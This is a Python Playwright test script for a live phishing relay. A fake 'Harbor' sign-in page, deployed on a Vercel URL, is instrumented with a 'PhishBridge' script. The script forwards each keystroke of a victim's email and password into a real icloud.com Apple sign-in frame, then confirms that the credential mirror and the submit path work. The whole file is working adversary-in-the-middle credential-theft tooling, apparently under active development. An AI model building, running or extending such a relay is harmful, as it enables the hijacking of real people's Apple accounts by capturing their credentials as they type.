#!/usr/bin/env python3
"""Live typing test: type char-by-char on the deployed Harbor page while draining the
bridge queue and forwarding each input event to the icloud.com frame in real time."""
from playwright.sync_api import sync_playwright
import phish_mirror as m

HARBOR = 'https://harbor-ten-lake.vercel.app'

with sync_playwright() as p:
    b = p.chromium.launch(channel='chrome', headless=True)

    victim_ctx = b.new_context(viewport={'width': 1000, 'height': 940})
    victim_ctx.add_init_script(m.PHISH_BRIDGE)
    victim_ctx.add_init_script(m.HARBOR_DRIVER)
    victim = victim_ctx.new_page()

    apple_ctx = b.new_context(viewport={'width': 1000, 'height': 940})
    apple = apple_ctx.new_page()
    frame = m.open_icloud_sign_in(apple)
    frame = m.apple_auth_frame(apple) or frame

    victim.goto(HARBOR + '/signin', wait_until='domcontentloaded', timeout=60000)
    victim.wait_for_timeout(1000)

    def drain_and_forward():
        """Mimic the phish_mirror loop: drain queue, forward input events."""
        global frame
        try:
            events = victim.evaluate("() => window.PhishBridge ? window.PhishBridge.queue() : []")
        except Exception:
            events = []
        for ev in events:
            if ev.get('type') == 'input':
                pl = ev.get('payload') or {}
                field, value = pl.get('field'), pl.get('value') or ''
                sel = {'account': '#account_name_text_field',
                       'password': '#password_text_field'}.get(field)
                if sel:
                    m.forward_input(apple, frame, sel, value)
                    frame = m.apple_auth_frame(apple) or frame
            elif ev.get('type') == 'submit':
                pl = ev.get('payload') or {}
                if pl.get('step') == 'email':
                    m.forward_email(apple, frame, pl.get('account') or '')
                elif pl.get('step') == 'password':
                    m.forward_password(apple, frame, pl.get('password') or '')
                frame = m.apple_auth_frame(apple) or frame
        return events

    def apple_value(sel):
        try:
            return frame.locator(sel).input_value(timeout=2000)
        except Exception:
            return '<err>'

    # --- type the email char by char, draining the queue between keystrokes ---
    victim.click('#account')
    word = 'victim@example.com'
    for i, ch in enumerate(word, start=1):
        victim.type('#account', ch, delay=0)
        victim.wait_for_timeout(50)  # loop tick
        drain_and_forward()
        if i in (1, 8, 16):
            print(f'after {i} chars -> apple = {apple_value("#account_name_text_field")!r}')

    victim.wait_for_timeout(150)
    drain_and_forward()
    final = apple_value('#account_name_text_field')
    print('FINAL apple field:', repr(final), '| expected:', repr(word))
    print('LIVE MIRROR:', 'OK' if final == word else 'FAIL')

    # --- Continue -> submit path still works ---
    victim.click('#continue-btn')
    victim.wait_for_timeout(1200)
    drain_and_forward()
    state = m.probe_apple_frame(frame)
    print('apple state after Continue:', state)

    b.close()